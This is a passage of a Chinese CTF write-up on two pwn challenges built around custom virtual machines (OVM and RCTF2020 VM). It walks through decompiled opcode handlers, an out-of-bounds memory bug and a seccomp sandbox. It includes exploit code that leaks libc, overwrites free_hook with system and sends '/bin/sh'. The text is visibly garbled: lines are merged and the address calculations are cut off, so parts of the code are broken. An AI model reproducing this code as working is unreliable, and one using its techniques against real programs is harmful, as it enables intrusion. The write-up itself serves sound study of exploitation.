      {
        result = (ssize_t)reg; 
        reg[v4] = (_BYTE)a1 == 0;
      }
      return result;
    }
分析完功能，我们可以发现在读取和写入内存并没有作出限制，存在越界读写漏洞，我们先将opcode封装成函数
    #reg[v4] = reg[v2] + reg[v3]
    def add(v4, v3, v2):
        return u32((p8(0x70)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v3] - reg[v2]
    def sub(v4, v3, v2):
        return u32((p8(0x80)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v2] & reg[v3]
    def AND(v4, v3, v2):
        return u32((p8(0x90)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v2] | reg[v3]
    def OR(v4, v3, v2):
        return u32((p8(0xa0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v2] ^ reg[v3]
    def xor(v4, v3, v2):
        return u32((p8(0xb0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v3] >> reg[v2]
    def right_shift(v4, v3, v2):
        return u32((p8(0xd0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    #reg[v4] = reg[v3]  {}'.format(hex(last_4bytes)))
    io.recvuntil('R4: ')
    first_4bytes = int(io.recv(4), 16)
    log.success('first_4bytes => {}'.format(hex(first_4bytes)))
    free_hook = (first_4bytes  {}'.format(free_hook))
    log.success('system_addr => {}'.format(system_addr))
    io.recvuntil('OVM?n')
    io.sendline('/bin/shx00'+p64(system_addr))
    io.interactive()
## 0x3.RCTF2020 VM
这题跟着ruan师傅的wp来复现
检查保护
IDA分析
先看到vm_start函数
    _QWORD *vm_start()
    {
      _QWORD *v1; // [rsp+0h] [rbp-10h]
      v1 = malloc(0x60uLL);
      v1[10] = malloc(0x1000uLL); //PC
      set_stack((__int64)v1, 0x800u); //stack
      return v1;
    }
再跟到set_stack函数中看看
    unsigned __int64 __fastcall set_stack(__int64 a1, unsigned int a2)
    {
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      if ( a2  0x1000 )
        sub_CAA("Invalid size!");
      *(_QWORD *)(a1 + 0x40) = malloc(a2);
      *(_QWORD *)(a1 + 0x48) = *(_QWORD *)(a1 + 0x40) + 8LL * (a2 >> 3);
      *(_QWORD *)(a1 + 0x40) = *(_QWORD *)(a1 + 0x48);
      *(_DWORD *)(a1 + 0x5C) = a2 >> 3;
      *(_DWORD *)(a1 + 0x58) = 0;
      return __readfsqword(0x28u) ^ v3;
    }
pwndbg里查看一下
继续往下看，循环读入code，之后会fork一个子进程，if语句中有一个沙箱
    unsigned __int64 sub_A3A()
    {
      __int16 v1; // [rsp+0h] [rbp-20h]
      void *v2; // [rsp+8h] [rbp-18h]
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      v1 = 11;
      v2 = &unk_203020;
      if ( prctl(38, 1LL, 0LL, 0LL, 0LL) < 0 )
        _exit(2);
      if ( prctl(22, 2LL, &v1) < 0 )
        _exit(2);
      return __readfsqword(0x28u) ^ v3;
    }
禁用了execve，因此我们只能通过orw来拿到flag
沙箱之下有一个check函数，check函数稍后再看，我们需要先弄清楚code是什么，往下看run函数，run函数接收两个参数，a1是vm结构体的指针，a2是经过了check之后的code的数量。
run函数很长，篇幅原因就挑几个分析一下。
    v7 = a2; 
    v34 = __readfsqword(0x28u);
    v30 = *(unsigned __int8 **)(a1 + 0x50);
    --------------------------    v2 = (unsigned __int8)take_value(v30); //取PC区第一个code的第一字节，标志类型
    if ( v2 == 7 ) //如果第一字节为7
    {
      if ( (unsigned __int8)take_value(v30 + 1) == 1 ) //如果第二字节为1
      {
        v13 = take_value(v30 + 2); //取第三字节
        *(_QWORD *)(8LL * v13 + a1) ^= take_value_QWORD((__int64)(v30 + 3));//以第三字节为索引，将8LL * v13 + a1中的值与code后8字节异或
        v30 += 0xB;//PC指针往后移到第二个code，1+1+1+8=11
      }
      else //如果第二字节不为1
      {
        v12 = take_value(v30 + 2);//取第3字节
        *(_QWORD *)(8LL * v12 + a1) ^= *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//以第四字节为索引，取出8LL * (unsigned __int8)take_value(v30 + 3) + a1中的值，与*(_QWORD *)(8LL * v12 + a1)中的值异或
        v30 += 4;//PC指针后移，1+1+1+1=4
      }
    }
    //xor功能标志位为7，通过第二字节是否为1，可以指定寄存器中的值与code中的数值异或，或者两个寄存器中的值进行异或
    --------------------------    else if ( !v2 ) //如果code第一字节为0
    {
      if ( (unsigned __int8)take_value(v30 + 1) == 1 ) //如果第二字节为1
      {
        v28 = take_value(v30 + 2); //取code第三字节
        *(_QWORD *)(8LL * v28 + a1) += take_value_QWORD((__int64)(v30 + 3)); //将*(_QWORD *)(8LL * v28 + a1)中的值与(v30 + 3)中的值相加
        v30 += 11;//PC指针后移，1+1+1+8=11
      }
      else //如果第二字节不为1
      {
        v27 = take_value(v30 + 2); //取第三字节
        *(_QWORD *)(8LL * v27 + a1) += *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将两个寄存器中的值相加，放入v27指定的寄存器中
        v30 += 4; //PC指针后移
      }
    }
    //add功能标志位为0，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相加
    --------------------------    else if ( v2 == 1 ) //如果第一字节为1
    {
      if ( (unsigned __int8)take_value(v30 + 1) == 1 ) //如果第二字节为1
      {
        v26 = take_value(v30 + 2); //取第三字节
        *(_QWORD *)(8LL * v26 + a1) -= take_value_QWORD((__int64)(v30 + 3)); //将以第二字节指定的寄存器中的值与code中的后八字节相减
        v30 += 11;//PC指针后移
      }
      else //如果第二字节不为1
      {
        v25 = take_value(v30 + 2); //取第三字节
        *(_QWORD *)(8LL * v25 + a1) -= *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将两个寄存器中的值相加，放入v27指定的寄存器中
        v30 += 4; //PC指针后移
      }
    }
    //sub功能标志位为1，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相减
    --------------------------    
就分析这几个指令吧，其他的和这几个的结构都差不多的，以第一字节作为标志位，标志执行什么功能，第二字节作为是寄存器之间进行操作还是寄存器与数值进行操作的标志位，第三字节指定第一个寄存器，当第二字节为1时，第四部分为一个八字节的数字，否则为一个一字节的数值，指定第二个寄存器。总结所有code如下：
    {"add":0,"sub":1,"mul":2,"div":3,"mov":4,"jsr":5,"and":6,"xor":7,"or":8,"not":9,"push":10,"pop":11,"jmp":12,"alloc":13,"nop":14}